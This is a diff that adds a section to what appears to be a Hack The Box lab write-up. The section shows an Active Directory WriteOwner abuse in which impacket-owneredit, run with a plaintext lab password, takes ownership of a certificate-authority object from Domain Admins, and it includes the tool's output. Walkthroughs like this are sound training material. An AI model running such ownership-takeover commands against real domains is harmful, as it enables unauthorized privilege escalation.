@@ -466,3 +466,15 @@ I have WriteOwner over the `CA_SVC` account
 
 # Abusing `WriteOwner` to compromise the `ca_svc` account
 
+```python
+impacket-owneredit -action write -new-owner 'ryan' -target-dn 'CN=CERTIFICATION AUTHORITY,CN=USERS,DC=SEQUEL,DC=HTB' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.129.232.128
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Current owner information below
+[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
+[*] - sAMAccountName: Domain Admins
+[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
+[*] OwnerSid modified successfully!
+```
+
+This granted me ownership now ill give myself full control ()
